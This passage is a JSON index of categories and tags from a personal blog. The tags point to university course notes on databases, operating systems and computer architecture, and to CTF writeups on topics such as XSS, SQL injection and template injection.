数据库","slug":"TUM课程笔记/Dantenbank-数据库","permalink":"https://archer-baiyi.github.io/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Dantenbank-%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"writeup","slug":"CTF/writeup","permalink":"https://archer-baiyi.github.io/categories/CTF/writeup/"}],"tags":[{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/tags/Web/"},{"name":"Injection","slug":"Injection","permalink":"https://archer-baiyi.github.io/tags/Injection/"},{"name":"Betriebssysteme","slug":"Betriebssysteme","permalink":"https://archer-baiyi.github.io/tags/Betriebssysteme/"},{"name":"Operating System","slug":"Operating-System","permalink":"https://archer-baiyi.github.io/tags/Operating-System/"},{"name":"进程","slug":"进程","permalink":"https://archer-baiyi.github.io/tags/%E8%BF%9B%E7%A8%8B/"},{"name":"线程","slug":"线程","permalink":"https://archer-baiyi.github.io/tags/%E7%BA%BF%E7%A8%8B/"},{"name":"Mutex","slug":"Mutex","permalink":"https://archer-baiyi.github.io/tags/Mutex/"},{"name":"Semaphore","slug":"Semaphore","permalink":"https://archer-baiyi.github.io/tags/Semaphore/"},{"name":"Petri-Netz","slug":"Petri-Netz","permalink":"https://archer-baiyi.github.io/tags/Petri-Netz/"},{"name":"synchron","slug":"synchron","permalink":"https://archer-baiyi.github.io/tags/synchron/"},{"name":"asynchron","slug":"asynchron","permalink":"https://archer-baiyi.github.io/tags/asynchron/"},{"name":"signal","slug":"signal","permalink":"https://archer-baiyi.github.io/tags/signal/"},{"name":"MongoDB","slug":"MongoDB","permalink":"https://archer-baiyi.github.io/tags/MongoDB/"},{"name":"注入","slug":"注入","permalink":"https://archer-baiyi.github.io/tags/%E6%B3%A8%E5%85%A5/"},{"name":"PHP","slug":"PHP","permalink":"https://archer-baiyi.github.io/tags/PHP/"},{"name":"switch","slug":"switch","permalink":"https://archer-baiyi.github.io/tags/switch/"},{"name":"XSS","slug":"XSS","permalink":"https://archer-baiyi.github.io/tags/XSS/"},{"name":"JavaScript","slug":"JavaScript","permalink":"https://archer-baiyi.github.io/tags/JavaScript/"},{"name":"html","slug":"html","permalink":"https://archer-baiyi.github.io/tags/html/"},{"name":"操作系统","slug":"操作系统","permalink":"https://archer-baiyi.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"内存管理","slug":"内存管理","permalink":"https://archer-baiyi.github.io/tags/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"},{"name":"Paging","slug":"Paging","permalink":"https://archer-baiyi.github.io/tags/Paging/"},{"name":"Page table","slug":"Page-table","permalink":"https://archer-baiyi.github.io/tags/Page-table/"},{"name":"Ersetztungsstrategie","slug":"Ersetztungsstrategie","permalink":"https://archer-baiyi.github.io/tags/Ersetztungsstrategie/"},{"name":"RCE","slug":"RCE","permalink":"https://archer-baiyi.github.io/tags/RCE/"},{"name":"JWT","slug":"JWT","permalink":"https://archer-baiyi.github.io/tags/JWT/"},{"name":"Rechnerarchitektur","slug":"Rechnerarchitektur","permalink":"https://archer-baiyi.github.io/tags/Rechnerarchitektur/"},{"name":"计算机体系结构","slug":"计算机体系结构","permalink":"https://archer-baiyi.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"},{"name":"逻辑电路图","slug":"逻辑电路图","permalink":"https://archer-baiyi.github.io/tags/%E9%80%BB%E8%BE%91%E7%94%B5%E8%B7%AF%E5%9B%BE/"},{"name":"逻辑门","slug":"逻辑门","permalink":"https://archer-baiyi.github.io/tags/%E9%80%BB%E8%BE%91%E9%97%A8/"},{"name":"wsl","slug":"wsl","permalink":"https://archer-baiyi.github.io/tags/wsl/"},{"name":"sage","slug":"sage","permalink":"https://archer-baiyi.github.io/tags/sage/"},{"name":"vscode","slug":"vscode","permalink":"https://archer-baiyi.github.io/tags/vscode/"},{"name":"Cookie","slug":"Cookie","permalink":"https://archer-baiyi.github.io/tags/Cookie/"},{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/tags/CTF/"},{"name":"哈希","slug":"哈希","permalink":"https://archer-baiyi.github.io/tags/%E5%93%88%E5%B8%8C/"},{"name":"Hash","slug":"Hash","permalink":"https://archer-baiyi.github.io/tags/Hash/"},{"name":"Misc","slug":"Misc","permalink":"https://archer-baiyi.github.io/tags/Misc/"},{"name":"esolang","slug":"esolang","permalink":"https://archer-baiyi.github.io/tags/esolang/"},{"name":"Piet","slug":"Piet","permalink":"https://archer-baiyi.github.io/tags/Piet/"},{"name":"SQL Injection","slug":"SQL-Injection","permalink":"https://archer-baiyi.github.io/tags/SQL-Injection/"},{"name":"SQL","slug":"SQL","permalink":"https://archer-baiyi.github.io/tags/SQL/"},{"name":"PHP 代码注入","slug":"PHP-代码注入","permalink":"https://archer-baiyi.github.io/tags/PHP-%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/"},{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"Codeforce","permalink":"https://archer-baiyi.github.io/tags/Codeforce/"},{"name":"1000","slug":"1000","permalink":"https://archer-baiyi.github.io/tags/1000/"},{"name":"greedy","slug":"greedy","permalink":"https://archer-baiyi.github.io/tags/greedy/"},{"name":"sortings","slug":"sortings","permalink":"https://archer-baiyi.github.io/tags/sortings/"},{"name":"Template Injection","slug":"Template-Injection","permalink":"https://archer-baiyi.github.io/tags/Template-Injection/"},{"name":"模板注入","slug":"模板注入","permalink":"https://archer-baiyi.github.io/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"},{"name":"Jinja2","slug":"Jinja2","permalink":"https://archer-baiyi.github.io/tags/Jinja2/"},{"name":"Mako","slug":"Mako","permalink":"https://archer-baiyi.github.io/tags/Mako/"},{"name":"C++","slug":"C","permalink":"https://archer-baiyi.github.io/tags/C/"},{"name":"cpp","slug":"cpp","permalink":"https://archer-baiyi.github.io/tags/cpp/"},{"name":"800","slug":"800","permalink":"https://archer-baiyi.github.io/tags/800/"},{"name":"文件系统","slug":"文件系统","permalink":"https://archer-baiyi.github.io/tags/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"},{"name":"输入/输出","slug":"输入-输出","permalink":"https://archer-baiyi.github.io/tags/%E8%BE%93%E5%85%A5-%E8%BE%93%E5%87%BA/"},{"name":"汇编语言","slug":"汇编语言","permalink":"https://archer-baiyi.github.io/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"},{"name":"RISC-V","slug":"RISC-V","permalink":"https://archer-baiyi.github.io/tags/RISC-V/"},{"name":"Reverse Engineering","slug":"Reverse-Engineering","permalink":"https://archer-baiyi.github.io/tags/Reverse-Engineering/"},{"name":"虚拟化","slug":"虚拟化","permalink":"https://archer-baiyi.github.io/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"},{"name":"虚拟机","slug":"虚拟机","permalink":"https://archer-baiyi.github.io/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA/"},{"name":"container","slug":"container","permalink":"https://archer-baiyi.github.io/tags/container/"},{"name":"Datenbank","slug":"Datenbank","permalink":"https://archer-baiyi.github.io/tags/Datenbank/"},{"name":"Database","slug":"Database","permalink":"https://archer-baiyi.github.io/tags/Database/"},{"name":"数据库","slug":"数据库","permalink":"https://archer-baiyi.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"socket","slug":"socket","permalink":"https://archer-baiyi.github.io/tags/socket/"},{"name":"remote","slug":"remote","permalink":"https://archer-baiyi.github.io/tags/remote/"},{"name":"writeup","slug":"writeup","permalink":"https://archer-baiyi.github.io/tags/writeup/"}]}